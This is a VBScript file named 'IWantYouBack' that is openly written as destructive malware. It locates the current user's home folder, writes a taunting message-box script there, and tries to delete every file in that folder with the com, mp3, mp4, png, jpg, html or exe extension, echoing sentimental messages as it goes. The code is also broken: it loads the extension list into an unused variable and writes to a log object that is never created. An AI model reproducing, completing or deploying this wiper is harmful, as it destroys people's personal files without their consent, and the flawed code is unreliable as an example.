Rem IWantYouBack
Rem by: Jabro
Rem HelloWorld at: 10/20/2024

Dim objFSO, objFile, fileExtensions
Dim objNetwork, userName, newFile, userDirectory, ext, logFile
Dim extensionsDict, notificationFilePath

Rem Create fso to interact with the file system
Set objFSO = CreateObject("Scripting.FileSystemObject")

Rem Get the current user’s home directory dynamically
Set objNetwork = CreateObject("WScript.Network")
userName = objNetwork.UserName
userDirectory = objFSO.BuildPath("C:\Users", userName)

Rem Check if the user directory exists
If Not objFSO.FolderExists(userDirectory) Then
    WScript.Echo "COME BACK " & userDirectory
End If

Rem File Extensions to Delete 
a=Array("com", "mp3", "mp4", "png", "jpg", "html", "exe")

Rem Check for the global notification file only once
notificationFilePath = objFSO.BuildPath(userDirectory, "IWantYouBack.vbs")
If Not objFSO.FileExists(notificationFilePath) Then
    Set newFile = objFSO.CreateTextFile(notificationFilePath, True)
    newFile.WriteLine("MsgBox ""I Want You Back..."", vbOKOnly")
    newFile.Close
End If

Rem Create a dictionary for fast extension lookups
Set extensionsDict = CreateObject("Scripting.Dictionary")
For Each ext In fileExtensions
    extensionsDict.Add LCase(ext), True
Next

Rem Delete files with the listed extensions in the user's directory
For Each objFile In objFSO.GetFolder(userDirectory).Files
    If extensionsDict.Exists(LCase(objFSO.GetExtensionName(objFile))) Then
        Rem Tries to delete files
        On Error Resume Next
        If (objFile.Attributes And 1) = 0 Then ' Check if the file is not read-only
            objFile.Delete
            WScript.echo "I'll always remember you..."
            If Err.Number <> 0 Then
                Rem Log error if file deletion fails
                logFile.WriteLine Now & " - PLEASE I WANT YOU BACK: " & objFile.Path & " - " & Err.Description
                Err.Clear
            Else
                Rem Log successful deletion
                logFile.WriteLine Now & " - Deleted: " & objFile.Path
            End If
        Else
            Rem Log if the file is read-only and cannot be deleted
            logFile.WriteLine Now & "..." & objFile.Path
        End If
        On Error GoTo 0
    End If
Next

Rem Close the log file if it exists
If Not logFile Is Nothing Then logFile.Close


Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK
Rem I WANT YOU BACK